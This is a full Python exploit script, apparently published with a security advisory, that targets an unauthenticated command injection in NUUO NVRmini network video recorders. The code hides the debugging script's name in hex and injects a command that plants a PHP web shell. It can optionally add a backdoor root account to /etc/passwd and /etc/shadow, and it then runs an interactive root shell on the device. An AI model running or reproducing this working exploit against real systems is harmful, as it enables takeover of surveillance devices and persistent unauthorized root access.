#!/usr/bin/env python
#
#
# NUUO Remote Root Exploit
#
#
# Vendor: NUUO Inc.
# Product web page: http://www.nuuo.com
# Affected version: <=3.0.8
#
# Summary: NUUO NVRmini 2 is the lightweight, portable NVR solution with NAS
# functionality. Setup is simple and easy, with automatic port forwarding
# settings built in. NVRmini 2 supports POS integration, making this the perfect
# solution for small retail chain stores. NVRmini 2 also comes full equipped as
# a NAS, so you can enjoy the full storage benefits like easy hard drive hot-swapping
# and RAID functions for data protection. Choose NVR and know that your valuable video
# data is safe, always.
#
# Desc: NUUO NVRmini, NVRmini2, Crystal and NVRSolo suffers from an unauthenticated command
# injection vulnerability. Due to an undocumented and hidden debugging script, an attacker
# can inject and execute arbitrary code as the root user via the 'log' GET parameter in the 
# '__debugging_center_utils___.php' script.
#
# -----------------------------------------------------
# $ nuuo.py 10.0.0.17 80
# [*] ==============================================
# [*] NUUO NVR/DVR/NDVR Remote Root Exploit
# [*] Zero Science Lab - http://www.zeroscience.mk
# [*] ==============================================
# [*] Backdoor detected!
# [*] Add root user (y/n)? n
# [*] Press [ ENTER ] to start root shell...
#
# root@nuuo:~# id
# uid=0(root) gid=0(root)
#
# root@nuuo:~# exit
#
# [*] Removing raidh.php file
# [*] Session terminated!
#
# $
# -----------------------------------------------------
#
# Tested on: GNU/Linux 3.0.8 (armv7l)
#            GNU/Linux 2.6.31.8 (armv5tel)
#            lighttpd/1.4.28
#            PHP/5.5.3
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
# Zero Science Lab - http://www.zeroscience.mk
#
#
# Advisory ID: ZSL-2016-5348
# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5348.php
# NSE Script: http://www.zeroscience.mk/codes/nuuo-backdoor.nse
# https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/40209.zip
#
#
# 14.01.2016
#

import os######
import sys#####
import time####
import urllib##
import binascii
import requests
 
__author__ = 'lqwrm'

def persist(host,port,hexy,clean):

    pwd = '''echo 'roOt:x:0:0:PWNED account:/:/bin/bash' >> /etc/passwd'''
    sdw = '''echo 'roOt:$1$MJOnV/Y3$tDnMIBMy0lEQ2kDpfgTJP0:16914:0:99999:7:::' >> /etc/shadow'''
    print '[*] Adding user \'roOt\' with password \'rewt\' in passwd file.'
    requests.get('http://'+host+':'+port+'/raidh.php?cmd='+pwd)
    time.sleep(2)
    
    print '[*] Updating shadow file.'
    requests.get('http://'+host+':'+port+'/raidh.php?cmd='+sdw)
    time.sleep(2)
    
    print '[*] Shell awaits: ssh roOt@'+host
    requests.get('http://'+host+':'+port+'/raidh.php?cmd='+urllib.quote(clean))
    exit(0)

def check(host,port,hexy):

    try:
        r = requests.get('http://'+host+':'+port+'/'+hexy, allow_redirects=False)
        if r.status_code == 200:
            print '[*] Backdoor detected!'
            pass
        else:
            print '[*] No backdoors here. :('
            exit(0)
    except Exception:
        print '[*] Could not connect.'
        exit(0)

def main():

    print '[*] =============================================='
    print '[*] NUUO NVR/DVR/NDVR Remote Root Exploit'
    print '[*] Zero Science Lab - http://www.zeroscience.mk'
    print '[*] =============================================='

    if (len(sys.argv) <= 2):
        print '[*] Usage: nuuo.py <ipaddress> <port>'
        exit(0)

    host = sys.argv[1]
    port = sys.argv[2]

    dbgcu = '5f5f64'#
    dbgcu+= '656275'#
    dbgcu+= '676769'#
    dbgcu+= '6e675f'#
    dbgcu+= '63656e'#
    dbgcu+= '746572'#
    dbgcu+= '5f7574'#
    dbgcu+= '696c73'#
    dbgcu+= '5f5f5f'#
    dbgcu+= '2e7068'#
    dbgcu+= '70'###'#

    hexy = binascii.unhexlify(dbgcu)
    check (host,port,hexy)

    payload = '''echo "<?php system(\$_REQUEST[\'cmd\']); ?>" > raidh.php'''
    requests.get('http://'+host+':'+port+'/'+hexy+'?log=1337;' + payload)

    clean = 'rm raidh.php'
    a1 = raw_input('[*] Add root user (y/n)? ')
    if a1.strip() == 'y' or a1.strip() == 'Y':
        persist (host,port,hexy,clean)
    else:
        pass

    print '[*] Press [ ENTER ] to start root shell...'
    raw_input()

    while True:
        try:
            cmd = raw_input('root@nuuo:~# ')
            if cmd.strip() == '':
                print '[*] Give me a command!\n'
                continue
            else:
                e = requests.get('http://'+host+':'+port+'/raidh.php?cmd='+urllib.quote(cmd))
                print e.text
            if cmd.strip() == 'exit':
                print '[*] Removing raidh.php file'
                requests.get('http://'+host+':'+port+'/raidh.php?cmd='+urllib.quote(clean))
                print '[*] Session terminated!'
                break
        except Exception:
            break

if __name__ == "__main__":
    main()